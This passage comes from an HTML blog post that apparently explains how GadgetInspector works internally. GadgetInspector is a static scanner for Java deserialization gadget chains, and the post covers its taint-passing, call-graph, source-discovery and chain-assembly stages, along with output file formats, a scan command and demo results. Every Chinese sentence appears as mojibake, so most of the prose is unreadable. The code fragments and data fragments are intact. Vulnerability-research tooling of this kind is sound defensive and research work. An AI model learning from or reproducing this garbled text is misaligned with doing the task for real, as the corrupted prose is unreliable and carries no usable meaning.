é€’æƒ…å†µï¼Œæœ€åæŠŠè¢«è°ƒç”¨æ–¹æ³•çš„æ±¡æŸ“å‚æ•°ç´¢å¼•æ”¾å…¥æ“ä½œæ•°æ ˆå†æ¬¡å›åˆ°å­ç±»ã€‚ç”±äºresultTaintæ˜¯Setç±»å‹ï¼Œæ‰€ä»¥æ·»åŠ æ—¶ä¼šè‡ªåŠ¨å¯¹ç´¢å¼•è¿›è¡Œå»é‡</p><p>TaintTrackingMethodVisitor#visitMethodInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/31.png"></p><p>å¦å¤–åœ¨2.3 CallGraphDiscovery#ModelGeneratorMethodVisitor ä¸­ä¼šåˆ¤æ–­è°ƒç”¨æ–¹æ³•çš„ä¼ å…¥å‚æ•°æ˜¯å¦ä¼šå½±å“è¢«è°ƒç”¨æ–¹æ³•çš„ä¼ å…¥å‚æ•°ï¼Œæœ€ååœ¨GadgetChainDiscoveryä¸­åˆ¤æ–­ä¸¤è€…å‚æ•°ç´¢å¼•æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´è¡¨æ˜æ­¤é“¾å¯ä»¥èµ°é€š</p><p>5ã€visitVarInsnï¼šè§‚å¯Ÿæ–¹æ³•æ—¶ï¼Œæ–¹æ³•ä½“å†…æ¯æ¬¡å¯¹å±€éƒ¨å˜é‡æ“ä½œæ—¶éƒ½ä¼šè§¦å‘visitVarInsnï¼Œæ­¤æ–¹æ³•åœ¨çˆ¶ç±»ä¸­å®šä¹‰ã€‚ åˆ©ç”¨pushã€popæ–¹æ³•å¯¹æœ¬åœ°å˜é‡è¡¨localVarsã€æ“ä½œæ•°æ ˆstackVarsæ“ä½œæ¨¡æ‹Ÿå‡ºæ ˆå…¥æ ˆ [type]STOREã€[type]LOADç­‰JVMæŒ‡ä»¤</p><p>TaintTrackingMethodVisitor#visitVarInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/32.png"></p><p>ç»è¿‡å¦‚ä¸Šåˆ†æï¼Œæœ€åå¾—åˆ°çš„åˆ†æç»“æœéƒ½ä¿å­˜åœ¨passthrough.datæ–‡ä»¶ä¸­ï¼Œæ ¼å¼ä¸ºï¼šç±» æ–¹æ³• æ–¹æ³•æè¿° æ±¡ç‚¹ç´¢å¼•</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/33.png"></p><h3 id="2-3-CallGraphDiscovery-æ–¹æ³•é—´çš„æ±¡ç‚¹ä¼ é€’"><a href="#2-3-CallGraphDiscovery-æ–¹æ³•é—´çš„æ±¡ç‚¹ä¼ é€’" class="headerlink" title="2.3 CallGraphDiscovery æ–¹æ³•é—´çš„æ±¡ç‚¹ä¼ é€’"></a>2.3 CallGraphDiscovery æ–¹æ³•é—´çš„æ±¡ç‚¹ä¼ é€’</h3><p>2.2ä¸­çš„PassthroughDiscoveryåˆ†æå¾—åˆ°çš„æ˜¯è°ƒç”¨æ–¹æ³•è¿”å›å€¼ä¸è¢«è°ƒç”¨æ–¹æ³•å‚æ•°ä¼ é€’çš„å…³ç³»ï¼Œå¦‚æœæƒ³è¦çŸ¥é“æ–¹æ³•é“¾èƒ½å¦ä»sourceæºèµ°é€šåˆ°sinkç‚¹ï¼Œè¿˜éœ€è¦åˆ†ææ¯ä¸ªè°ƒç”¨æ–¹æ³•å…¥å‚ä¸è¢«è°ƒç”¨æ–¹æ³•å…¥å‚çš„ä¼ é€’å…³ç³»ï¼ŒCallGraphDiscoveryç±»å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜</p><p>è¿™ä¸€æ­¥çš„æ ¸å¿ƒä½¿ç”¨äº†ModelGeneratorClassVisitorï¼Œå…¶å®ç°äº†visitMethodã€visitOuterClassã€visitInnerClassç­‰æ–¹æ³•ï¼Œåœ¨visitMethodæ–¹æ³•ä¸­ä½¿ç”¨ModelGeneratorMethodVisitorè¿›è¡Œæ–¹æ³•çº§åˆ«çš„è§‚å¯Ÿåˆ†æã€‚ModelGeneratorMethodVisitorç±»ä¸PassthroughDataflowMethodVisitorä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿è‡ªTaintTrackingMethodVisitorç±»ï¼Œçˆ¶ç±»æˆ‘ä»¬åœ¨ä¸Šä¸€æ­¥2.2ç« å·²ç»åˆ†æè¿‡ä¸å†èµ˜è¿°ã€‚å­ç±»ModelGeneratorMethodVisitorä¸»è¦æ–¹æ³•æœ‰ï¼švisitCodeã€visitMethodInsnã€visitFieldInsnï¼Œä¾æ¬¡åˆ†æä¸‹ï¼š</p><p>1ã€åˆ©ç”¨visitCode() å¾€æœ¬åœ°å˜é‡è¡¨æ·»åŠ è°ƒç”¨æ–¹æ³•å…¥å‚(å½“æ–¹æ³•å­˜åœ¨2ä¸ªå½¢å‚æ—¶ï¼Œéé™æ€æ–¹æ³•ï¼š[[0,arg0],[1,arg1],[2,arg2]]  é™æ€æ–¹æ³•ï¼š[[0,arg0],[1,arg1]])ï¼›</p><p>CallGraphDiscovery.ModelGeneratorMethodVisitor#visitCode</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/34.png"></p><p>2ã€åˆ©ç”¨visitFieldInsn()å°†è·å–çš„fieldåç§°å˜ä¸ºarg[n].[name]æ”¾å…¥æ“ä½œæ•°æ ˆä¾›åé¢æ–¹æ³•è°ƒç”¨æ—¶ä½¿ç”¨ï¼Œè¿™ä¸€æ­¥ä¸»è¦ä½œç”¨æ˜¯å°†æ–¹æ³•ä½“å†…æ“ä½œçš„å±æ€§ä¸æ–¹æ³•å…¥å‚åšå…³è”ï¼Œç”¨äºåˆ¤æ–­è°ƒç”¨æ–¹æ³•å…¥å‚ä¸è¢«è°ƒç”¨æ–¹æ³•å…¥å‚çš„å…³ç³»ã€‚è€Œè¿™é‡Œä¹Ÿä½¿ç”¨äº†è·Ÿ2.2ç« ä¸€æ ·çš„åˆ¤æ–­é€»è¾‘ï¼šå› ä¸ºjavaé‡Œé¢è§„å®šTransientä¿®é¥°å±æ€§ä¸å‚ä¸ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ‰€ä»¥ä¸è€ƒè™‘Transientå±æ€§ä¿®é¥°çš„å˜é‡ä¼ é€’ã€‚ä½†æ˜¯åœ¨å®é™…æŒ–æ˜è¿‡ç¨‹ä¸­è¿˜å­˜åœ¨ä¸€ç§æƒ…å†µï¼šè™½ç„¶å±æ€§è¢«Transientä¿®é¥°ï¼Œä½†æ˜¯ç±»è‡ªå·±å®ç°äº†writeObject&#x2F;writeExternalæ–¹æ³•ï¼Œæ–¹æ³•ä½“å†…ä¼šå£°æ˜å°†Transientå±æ€§å‚ä¸åˆ°åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ã€‚è¿™ç§æƒ…å†µåœ¨ä¹‹å‰çš„gadgetä¸­ä¹Ÿæ¯”è¾ƒå¸¸è§ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦é¢å¤–è¡¥å……å®Œå–„ä¸‹Transientå±æ€§çš„åˆ¤æ–­é€»è¾‘</p><p>CallGraphDiscovery.ModelGeneratorMethodVisitor#visitFieldInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/35.png"></p><p>3ã€visitMethodInsn()æ–¹æ³•åˆ›å»ºäº†arg[N]è¿›è¡Œæ ‡è®°ï¼Œåˆ†æè°ƒç”¨æ–¹æ³•ä¸è¢«è°ƒç”¨æ–¹æ³•é—´çš„å‚æ•°ä¼ é€’å…³ç³»ï¼Œå¹¶æœ€ç»ˆå°†ç»“æœèµ‹å€¼discoveredCallså­˜å‚¨åˆ°callgraph.datä¸­ï¼Œæ ¼å¼ä¸º<code>è°ƒç”¨è€…ç±»å | è°ƒç”¨è€…æ–¹æ³• | è°ƒç”¨è€…æ–¹æ³•æè¿° | è¢«è°ƒç”¨è€…ç±»å | è¢«è°ƒç”¨è€…æ–¹æ³• | è¢«è°ƒç”¨è€…æ–¹æ³•æè¿° | è°ƒç”¨è€…æ–¹æ³•å‚index | è°ƒç”¨è€…å­—æ®µå | è¢«è°ƒç”¨è€…æ–¹æ³•å‚æ•°ç´¢å¼•</code></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/36.png"></p><p>4ã€ä¸¾ä¸ªä¾‹å­ï¼ŒcreateMBeanæ–¹æ³•ç»è¿‡ModelGeneratorClassVisitoræ‰«æåå¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œè°ƒç”¨æ–¹æ³•createMBeanå‚æ•°ç´¢å¼•(ç¬¬2ä¸ªå½¢å‚name)ä¸è¢«è°ƒç”¨æ–¹æ³•cloneObjectName(ç¬¬1ä¸ªå½¢å‚name)çš„å‚æ•°ä¼ é€’ã€‚è°ƒç”¨è€…å­—æ®µåçš„å€¼ä¸ºç©ºï¼Œè¯´æ˜ä»è°ƒç”¨æ–¹æ³•å…¥å‚ä¼ é€’åˆ°è¢«è°ƒç”¨æ–¹æ³•å…¥å‚çš„æ˜¯å…¥å‚å®ä¾‹ï¼ˆarg1ï¼‰è€Œä¸æ˜¯å…¥å‚ç±»å®ä¾‹çš„å±æ€§(arg1.nameã€arg1.pwd)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">è°ƒç”¨è€…ç±»å | è°ƒç”¨è€…æ–¹æ³• | è°ƒç”¨è€…æ–¹æ³•æè¿° | è¢«è°ƒç”¨è€…ç±»å | è¢«è°ƒç”¨è€…æ–¹æ³• | è¢«è°ƒç”¨è€…æ–¹æ³•æè¿° | è°ƒç”¨è€…æ–¹æ³•å‚index | è°ƒç”¨è€…å­—æ®µå | è¢«è°ƒç”¨è€…æ–¹æ³•å‚æ•°ç´¢å¼•<br>com<span class="hljs-regexp">/sun/</span>jmx<span class="hljs-regexp">/mbeanserver/</span>JmxMBeanServercreateMBean(Ljava<span class="hljs-regexp">/lang/</span>String;Ljavax<span class="hljs-regexp">/management/</span>ObjectName;)Ljavax<span class="hljs-regexp">/management/</span>ObjectInstance;com<span class="hljs-regexp">/sun/</span>jmx<span class="hljs-regexp">/mbeanserver/</span>JmxMBeanServercloneObjectName(Ljavax<span class="hljs-regexp">/management/</span>ObjectName;)Ljavax<span class="hljs-regexp">/management/</span>ObjectName;<span class="hljs-number">2</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean(java.lang.String, javax.management.ObjectName)</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">createMBean</span>(<span class="hljs-built_in">String</span> className, ObjectName name)<br>        <span class="hljs-keyword">throws</span> ReflectionException, InstanceAlreadyExistsException,<br>               MBeanRegistrationException, MBeanException,<br>               NotCompliantMBeanException &#123;<br><br>        <span class="hljs-keyword">return</span> mbsInterceptor.<span class="hljs-property">createMBean</span>(className,<br>                                          <span class="hljs-title function_">cloneObjectName</span>(name),<br>                                          (<span class="hljs-built_in">Object</span>[]) <span class="hljs-literal">null</span>,<br>                                          (<span class="hljs-built_in">String</span>[]) <span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/37.png"></p><h3 id="2-4-SourceDiscovery-Sourceæºå‘ç°"><a href="#2-4-SourceDiscovery-Sourceæºå‘ç°" class="headerlink" title="2.4 SourceDiscovery Sourceæºå‘ç°"></a>2.4 SourceDiscovery Sourceæºå‘ç°</h3><p>SourceDiscoveryæ˜¯æŠ½è±¡ç±»ï¼Œå…¶discover(classMapï¼ŒmethodMapï¼ŒinheritanceMap)æ–¹æ³•åªæä¾›äº†å®šä¹‰ï¼Œå…·ä½“çš„å®ç°éœ€è¦ä½¿ç”¨è€…è‡ªå·±æ‰©å±•ç¼–å†™ã€‚è€Œgadgetinspectorå†…ç½®äº†javaåŸç”Ÿååºåˆ—åŒ–ã€jacksonååºåˆ—åŒ– çš„SourceDiscoveryå®ç°ç±»</p><p>è¯¥æ­¥éª¤ä¸»è¦æŸ¥æ‰¾ååºåˆ—åŒ–å…¥å£æ–¹æ³•ï¼Œæ¯ç§ååºåˆ—åŒ–æ“ä½œçš„å…¥å£æ–¹æ³•ä¸åŒï¼Œå¦‚fastjson&#x2F;jacksonçš„å…¥å£æ˜¯getter&#x2F;setteræ–¹æ³•ã€javaåŸç”Ÿååºåˆ—åŒ–æ˜¯readObject&#x2F;readExternaæ–¹æ³•ã€‚è¿™é‡Œå…ˆä»¥å†…ç½®çš„jacksonä¸ºä¾‹åˆ†æï¼Œjacksonåœ¨å¯¹jsonå­—ç¬¦ä¸²ååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„æ— å‚æ„é€ æ–¹æ³•è¿›è¡Œç±»å®ä¾‹åŒ–ï¼Œæ‰€ä»¥åªæœ‰å­˜åœ¨æ— å‚æ„é€ æ–¹æ³•çš„ç±»æ‰æ»¡è¶³jacksonåºåˆ—åŒ–ç±»çš„è¦æ±‚ï¼Œå¦å¤–åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šæ ¹æ®å…·ä½“æƒ…å†µè°ƒç”¨getter&#x2F;setteræ–¹æ³•ã€‚æ‰€ä»¥åœ¨æ‰«æjacksonååºåˆ—åŒ–gadgetæ—¶æŠŠè¿™ä¸‰ä¸ªæ–¹æ³•å‡æ·»åŠ åˆ°sourceé‡Œé¢è¿›è¡Œæ‰«æ</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/38.png"></p><p>æœ€ç»ˆæŠŠæ‰«æçš„ç»“æœå­˜å‚¨åˆ°source.datæ–‡ä»¶ä¸­ï¼Œæ ¼å¼å¦‚ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ç±»å æ–¹æ³•å æ–¹æ³•æè¿° æ±¡æŸ“å‚æ•°ç´¢å¼•<br>java<span class="hljs-regexp">/awt/</span>TextField&lt;init&gt;()V<span class="hljs-number">0</span><br>javax<span class="hljs-regexp">/swing/</span>JTextFieldsetActionCommand(Ljava<span class="hljs-regexp">/lang/</span>String;)V<span class="hljs-number">0</span><br>javax<span class="hljs-regexp">/swing/</span>JEditorPanesetPage(Ljava<span class="hljs-regexp">/lang/</span>String;)V<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="2-5-GadgetChainDiscovery-ä¿¡æ¯æ•´åˆä¸ºGadgetChain"><a href="#2-5-GadgetChainDiscovery-ä¿¡æ¯æ•´åˆä¸ºGadgetChain" class="headerlink" title="2.5 GadgetChainDiscovery ä¿¡æ¯æ•´åˆä¸ºGadgetChain"></a>2.5 GadgetChainDiscovery ä¿¡æ¯æ•´åˆä¸ºGadgetChain</h3><p>GadgetChainDiscovery#discover æ–¹æ³•å¯¹ä¸Šè¿°æœé›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯è¿›è¡Œæ•´åˆï¼Œç„¶åå°†æ¯ä¸ªsourceä½œä¸ºåˆ©ç”¨é“¾çš„èµ·ç‚¹å¯»æ‰¾è°ƒç”¨çš„å­æ–¹æ³•ã€èƒ½å°†å‚æ•°æ±¡æŸ“ä¼ é€’çš„å­æ–¹æ³•ï¼Œå¦‚æœæœ«èŠ‚ç‚¹è°ƒç”¨åˆ°å…ˆå‰å®šä¹‰å¥½çš„sinkæ–¹æ³•ï¼Œè¯´æ˜åˆ©ç”¨é“¾å¯ä»¥èµ°é€šï¼Œé‚£ä¹ˆå°±æ ‡è®°æˆåŠŸï¼Œæ·»åŠ åˆ°discoveredGadgetsä¸­ã€‚å¦åˆ™å†æ¬¡å¾ªç¯methodsToExploreè·å–æ–¹æ³•è¿›è¡Œåˆ†æç›´åˆ°æ–¹æ³•å¾ªç¯å®Œæ¯•ã€‚ä¸»è¦çœ‹ä¸‹å¯¹äºé‡å†™æ–¹æ³•ã€æœç´¢ç­–ç•¥çš„å¤„ç†</p><p>1ã€InheritanceDeriver#getAllMethodImplementationsæœé›†é‡å†™æ–¹æ³•</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/39.png"></p><p>å°†æœé›†åˆ°çš„é‡å†™æ–¹æ³•çš„ç»“æœä¿å­˜åˆ°methodimpl.datï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">ç±» æ–¹æ³• æ–¹æ³•æè¿°<br>å­ç±»1 é‡å†™æ–¹æ³• æ–¹æ³•æè¿°<br>å­ç±»2 é‡å†™æ–¹æ³• æ–¹æ³•æè¿°<br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/40.png"></p><p>2ã€å°†è°ƒç”¨çš„æ–¹æ³•é›†åˆè§„æ•´æ ¼å¼å¾—åˆ°graphCallMapï¼Œkeyä¸ºè°ƒç”¨æ–¹æ³•ã€valueä¸ºè¢«è°ƒç”¨æ–¹æ³•Set(æ·»åŠ æ—¶è‡ªåŠ¨æŠ›å¼ƒé‡å¤æ–¹æ³•)</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/41.png"></p><p>å¦‚ä¸Šé¢æåˆ°çš„com.sun.jmx.mbeanserver.JmxMBeanServer#createMBeanæ–¹æ³•è°ƒç”¨äº†createMBeanã€cloneObjectNameä¸¤ä¸ªæ–¹æ³•ï¼Œè¿™ä¸€æ­¥å°±æ˜¯å°†ä¸¤ä¸ªå­æ–¹æ³•æ•´åˆï¼Œæœ€ç»ˆå¾—åˆ°[JmxMBeanServer#createMBeanï¼š[createMBeanï¼ŒcloneObjectName]]è¿™ç§ç»“æ„</p><p><img src="/../../../2%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/gadgetinspector/1%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/img/1676531278617.png" alt="1676531278617"></p><p>3ã€åŠ è½½2.4ç« ä¸­å¾—åˆ°çš„sources.datï¼Œå°†æ¯ä¸ªsourceåšä¸ºGadgetChainé“¾çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ç¨‹åºå¾ªç¯å°†åˆ©ç”¨é“¾GadgetChainçš„æœ«èŠ‚ç‚¹åšä¸ºèµ·ç‚¹æ–¹æ³•æŸ¥æ‰¾å¯è°ƒç”¨çš„å­æ–¹æ³•ã€å¯ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•ï¼Œå¦‚æœå¯ä»¥ä¼ é€’æ±¡æŸ“ï¼Œé‚£ä¹ˆå°±å°†è¢«è°ƒç”¨æ–¹æ³•åŠ åˆ°åˆ©ç”¨é“¾ã€‚æœ€ååˆ¤æ–­å¦‚æœæœ«èŠ‚ç‚¹è°ƒç”¨åˆ°æˆ‘ä»¬å…ˆå‰å®šä¹‰å¥½çš„sinkæ–¹æ³•ï¼Œè¯´æ˜åˆ©ç”¨é“¾å¯ä»¥èµ°é€šï¼Œé‚£ä¹ˆå°±æ ‡è®°æˆåŠŸï¼Œæ·»åŠ åˆ°discoveredGadgetsä¸­ã€‚å¦åˆ™å†æ¬¡å¾ªç¯methodsToExploreè¿›è¡ŒæŸ¥æ‰¾ç›´åˆ°æ–¹æ³•å¾ªç¯å®Œæ¯•</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/42.png"></p><p>å¦‚ä¸‹å›¾çš„åœˆ1åˆ¤æ–­å½“â€å¯ä¼ é€’æ±¡æŸ“ç»™å­æ–¹æ³•çš„è°ƒç”¨æ–¹æ³•å‚æ•°ç´¢å¼•â€ä¸â€è°ƒç”¨æ–¹æ³•å¯ä»¥æ§åˆ¶çš„å‚æ•°ç´¢å¼•â€ä¸ä¸€è‡´æ—¶ï¼Œæ±¡æŸ“å°±æ— æ³•ä¼ é€’ï¼Œpassã€‚åœˆ2ç”¨äºå¤„ç†â€é™æ€åˆ†ææ— æ³•ç¡®è®¤ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨å“ªä¸ªå®ç°æ–¹æ³•â€çš„é—®é¢˜ï¼Œæ‰€ä»¥å°†æ‰€æœ‰å®ç°æ–¹æ³•éƒ½è·‘ä¸€éã€‚åœˆ3åˆ¤æ–­å¦‚æœæ–°èŠ‚ç‚¹åœ¨ä¹‹å‰è®¿é—®è¿‡ï¼Œåˆ™è·³è¿‡æ£€æŸ¥ã€‚è¿™é‡Œè™½ç„¶å¯ä»¥é¿å…ç¯çš„é—®é¢˜ï¼Œä½†æ˜¯ä¼šé€ æˆæ¼æŠ¥ï¼Œéœ€è¦ä¿®æ”¹ä¸‹é€»è¾‘ã€‚åœˆ4åˆ¤æ–­æœ«èŠ‚ç‚¹çš„æ–¹æ³•ã€æ±¡æŸ“çš„å‚æ•°æ˜¯å¦ä¸å®šä¹‰å¥½çš„sinkä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™æ·»åŠ åˆ°åˆ©ç”¨é“¾discoveredGadgets</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/43.png"></p><p>ç»è¿‡MethodDiscoveryè·å–ç±»&#x2F;æ–¹æ³•&#x2F;ç»§æ‰¿å…³ç³»ä¿¡æ¯ã€PassthroughDiscoveryè·å–å•ä¸ªæ–¹æ³•å†…çš„æ±¡æŸ“ä¼ é€’ã€CallGraphDiscoveryè·å–æ–¹æ³•é—´çš„æ±¡æŸ“ä¼ é€’ã€SourceDiscoveryè·å–åˆ©ç”¨é“¾çš„sourceæºï¼Œæœ€ç»ˆé€šè¿‡GadgetChainDiscovery åˆ†æå‰é¢å¾—åˆ°çš„ä¿¡æ¯å¹¶æ•´åˆä¸ºGadgetChainç»“æœå­˜å‚¨åˆ°gadget-chains.txtæ–‡ä»¶ä¸­</p><h2 id="3ã€å®é™…æµ‹è¯•"><a href="#3ã€å®é™…æµ‹è¯•" class="headerlink" title="3ã€å®é™…æµ‹è¯•"></a>3ã€å®é™…æµ‹è¯•</h2><p>äº†è§£äº†å¦‚ä¸Šé¡¹ç›®æºç ã€å·¥å…·è¿è¡Œæµç¨‹ä¹‹åï¼Œæˆ‘ä»¬å®é™…ä½¿ç”¨GadgetInspectoræ‰«ææµ‹è¯•ä¸€ä¸ªDemo jaråŒ…æ„Ÿå—ä¸‹</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Demoä»£ç <br>GadgetInspector-Test-Demo\out\artifacts\GadgetInspector_Test_Demo<br><br>ç¼–è¯‘gadget-<span class="hljs-keyword">inspector</span><br><span class="hljs-keyword"></span>GadGetResearch\gadgetinspector-master&gt;gradlew.<span class="hljs-keyword">bat </span><span class="hljs-keyword">shadowJar </span>--warning-mode all<br><br>æ‰«æå‘½ä»¤<br><span class="hljs-keyword">java </span>-Xmx10g -<span class="hljs-keyword">jar </span>gadget-<span class="hljs-keyword">inspector-all.jar </span>--<span class="hljs-built_in">config</span> <span class="hljs-keyword">jserial </span>E:\imgs-source\GadgetInspector-Test-Demo\out\artifacts\GadgetInspector_Test_Demo\GadgetInspector-Test-Demo.<span class="hljs-keyword">jar</span><br><span class="hljs-keyword"></span><br>é¡¹ç›®æ–‡ä»¶ç”Ÿæˆä½ç½®<br>GadGetResearch\gadgetinspector-master\<span class="hljs-keyword">build\libs</span><br></code></pre></td></tr></table></figure><p>1ã€æšä¸¾æ‰€æœ‰ç±»åŠç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œè¾“å‡ºç±»ä¿¡æ¯æ–‡ä»¶classes.dat</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">org<span class="hljs-regexp">/example/</span>FnComposejava<span class="hljs-regexp">/lang/</span>Objectorg<span class="hljs-regexp">/example/I</span>Fn,java<span class="hljs-regexp">/io/</span>Serializable<span class="hljs-keyword">false</span>f1!<span class="hljs-number">2</span>!org<span class="hljs-regexp">/example/I</span>Fn!f2!<span class="hljs-number">2</span>!org<span class="hljs-regexp">/example/I</span>Fn<br>org<span class="hljs-regexp">/example/</span>FnConstantjava<span class="hljs-regexp">/lang/</span>Objectorg<span class="hljs-regexp">/example/I</span>Fn,java<span class="hljs-regexp">/io/</span>Serializable<span class="hljs-keyword">false</span>value!<span class="hljs-number">2</span>!java<span class="hljs-regexp">/lang/</span>Object<br>org<span class="hljs-regexp">/example/</span>FnEvaljava<span class="hljs-regexp">/lang/</span>Objectorg<span class="hljs-regexp">/example/I</span>Fn,java<span class="hljs-regexp">/io/</span>Serializable<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/I</span>Fnjava<span class="hljs-regexp">/lang/</span>Object<span class="hljs-keyword">true</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModeljava/</span>lang<span class="hljs-regexp">/Objectjava/i</span>o<span class="hljs-regexp">/Serializablefalse__clojureFnMap!2!java/u</span>til/HashMap<br>org<span class="hljs-regexp">/example/</span>TestDemojava<span class="hljs-regexp">/lang/</span>Object<span class="hljs-keyword">false</span>test!<span class="hljs-number">2</span>!java<span class="hljs-regexp">/lang/</span>String<br></code></pre></td></tr></table></figure><table><thead><tr><th>ç±»å</th><th>çˆ¶ç±»å</th><th>å®ç°çš„æ‰€æœ‰æ¥å£</th><th>æ˜¯å¦æ¥å£</th><th>æˆå‘˜å˜é‡(ä»¥!åˆ†å‰²)</th></tr></thead><tbody><tr><td>org&#x2F;example&#x2F;FnCompose</td><td>java&#x2F;lang&#x2F;Object</td><td>org&#x2F;example&#x2F;IFn,java&#x2F;io&#x2F;Serializable</td><td>false</td><td>f1!2!org&#x2F;example&#x2F;IFn!f2!2!org&#x2F;example&#x2F;IFn</td></tr></tbody></table><p>æˆå‘˜å˜é‡f1!2!org&#x2F;example&#x2F;IFn!è¡¨ç¤ºï¼šå­—æ®µåç§°ä¸ºf1ã€modifiersä¸º2(privateä¿®é¥°)ã€å˜é‡ç±»å‹ä¸ºorg&#x2F;example&#x2F;IFnç±»</p><p>åœ¨gadgetinspectorä¸­çš„å®šä¹‰ç±»ä¸ºgadgetinspector.data.ClassReferenceã€gadgetinspector.data.ClassReference.Member</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/44.png"></p><p>è¾“å‡ºæ–¹æ³•ä¿¡æ¯æ–‡ä»¶methods.dat</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">org<span class="hljs-regexp">/example/</span>FnCompose&lt;init&gt;(Lorg<span class="hljs-regexp">/example/I</span>Fn;Lorg<span class="hljs-regexp">/example/I</span>Fn;)V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnConstant&lt;init&gt;(Ljava<span class="hljs-regexp">/lang/</span>Object;)V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnConstantinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnEval&lt;init&gt;()V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnEvalinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModel&lt;init&gt;(Ljava/u</span>til/HashMap;)V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/m</span>odel/AbstractTableModelhashCode()I<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>TestDemo&lt;init&gt;()V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-keyword">false</span><br>org<span 